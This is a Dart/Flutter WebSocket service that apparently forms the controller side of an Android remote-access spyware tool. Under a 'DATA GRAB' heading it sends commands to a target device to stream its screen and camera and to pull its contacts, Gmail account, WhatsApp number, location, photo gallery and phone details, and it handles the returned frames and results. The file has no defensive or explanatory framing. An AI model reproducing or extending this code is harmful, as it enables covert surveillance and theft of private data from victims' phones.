// lib/services/websocket_service.dart
import 'dart:async';
import 'dart:convert';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../utils/constants.dart';

class WebSocketService {
  static final WebSocketService _instance = WebSocketService._internal();
  factory WebSocketService() => _instance;
  WebSocketService._internal();

  WebSocketChannel? _channel;
  final StreamController<Map<String, dynamic>> _messageController =
      StreamController.broadcast();
  final StreamController<Map<String, dynamic>> _commandController =
      StreamController.broadcast();

  bool _isConnected = false;
  String? _deviceId;
  Timer? _reconnectTimer;
  int _reconnectAttempts = 0;
  static const int _maxReconnectAttempts = 10;

  // ============================================================
  //  STREAMS
  // ============================================================
  Stream<Map<String, dynamic>> get onMessage => _messageController.stream;
  Stream<Map<String, dynamic>> get onCommand => _commandController.stream;

  // ============================================================
  //  CONNECT
  // ============================================================
  Future<void> connect({String? deviceId}) async {
    if (_isConnected) return;

    _deviceId = deviceId;
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('token') ?? '';

    final url = '${AppConstants.wsBaseUrl}?token=$token';
    if (deviceId != null) {
      final urlWithDevice = '$url&deviceId=$deviceId';
      _channel = WebSocketChannel.connect(Uri.parse(urlWithDevice));
    } else {
      _channel = WebSocketChannel.connect(Uri.parse(url));
    }

    _channel!.stream.listen(
      _handleMessage,
      onDone: _handleDisconnect,
      onError: _handleError,
    );

    _isConnected = true;
    _reconnectAttempts = 0;
    print('🔗 WebSocket connected');
  }

  // ============================================================
  //  HANDLE MESSAGE
  // ============================================================
  void _handleMessage(dynamic data) {
    try {
      final json = jsonDecode(data);
      final type = json['type'] ?? '';

      switch (type) {
        case 'deviceStatus':
          _messageController.add(json);
          break;
        case 'command':
          _commandController.add(json);
          break;
        case 'screenFrame':
          _messageController.add(json);
          break;
        case 'cameraFrame':
          _messageController.add(json);
          break;
        case 'contactsResult':
          _messageController.add(json);
          break;
        case 'gmailResult':
          _messageController.add(json);
          break;
        case 'waResult':
          _messageController.add(json);
          break;
        case 'locationResult':
          _messageController.add(json);
          break;
        case 'galleryResult':
          _messageController.add(json);
          break;
        case 'phoneInfoResult':
          _messageController.add(json);
          break;
        default:
          _messageController.add(json);
      }
    } catch (e) {
      // Raw data
      _messageController.add({'raw': data});
    }
  }

  // ============================================================
  //  HANDLE DISCONNECT
  // ============================================================
  void _handleDisconnect() {
    _isConnected = false;
    print('🔌 WebSocket disconnected');

    // Auto reconnect
    _reconnectAttempts++;
    if (_reconnectAttempts <= _maxReconnectAttempts) {
      final delay = Duration(seconds: _reconnectAttempts * 2);
      _reconnectTimer?.cancel();
      _reconnectTimer = Timer(delay, () {
        print('🔄 Reconnecting... (${_reconnectAttempts}/$_maxReconnectAttempts)');
        connect(deviceId: _deviceId);
      });
    }
  }

  // ============================================================
  //  HANDLE ERROR
  // ============================================================
  void _handleError(error) {
    print('❌ WebSocket error: $error');
    _handleDisconnect();
  }

  // ============================================================
  //  SEND MESSAGE
  // ============================================================
  void send(Map<String, dynamic> data) {
    if (_isConnected && _channel != null) {
      _channel!.sink.add(jsonEncode(data));
    }
  }

  // ============================================================
  //  COMMAND
  // ============================================================
  void sendCommand(String command, {Map<String, dynamic>? params}) {
    send({
      'type': 'command',
      'command': command,
      'params': params ?? {},
      'deviceId': _deviceId,
      'timestamp': DateTime.now().toIso8601String(),
    });
  }

  // ============================================================
  //  STREAM
  // ============================================================
  void startScreenStream() {
    sendCommand('startScreenStream');
  }

  void stopScreenStream() {
    sendCommand('stopScreenStream');
  }

  void startCameraStream(String facing) {
    sendCommand('startCameraStream', params: {'facing': facing});
  }

  void stopCameraStream() {
    sendCommand('stopCameraStream');
  }

  // ============================================================
  //  DATA GRAB
  // ============================================================
  void getContacts() {
    sendCommand('getContacts');
  }

  void getGmail() {
    sendCommand('getGmail');
  }

  void getWhatsAppNumber() {
    sendCommand('getWhatsAppNumber');
  }

  void getLocation() {
    sendCommand('getLocation');
  }

  void getGallery() {
    sendCommand('getGallery');
  }

  void getPhoneInfo() {
    sendCommand('getPhoneInfo');
  }

  // ============================================================
  //  DISCONNECT
  // ============================================================
  void disconnect() {
    _reconnectTimer?.cancel();
    _channel?.sink.close();
    _isConnected = false;
    print('🔌 WebSocket disconnected manually');
  }

  // ============================================================
  //  GETTER
  // ============================================================
  bool get isConnected => _isConnected;

  void dispose() {
    disconnect();
    _messageController.close();
    _commandController.close();
  }
}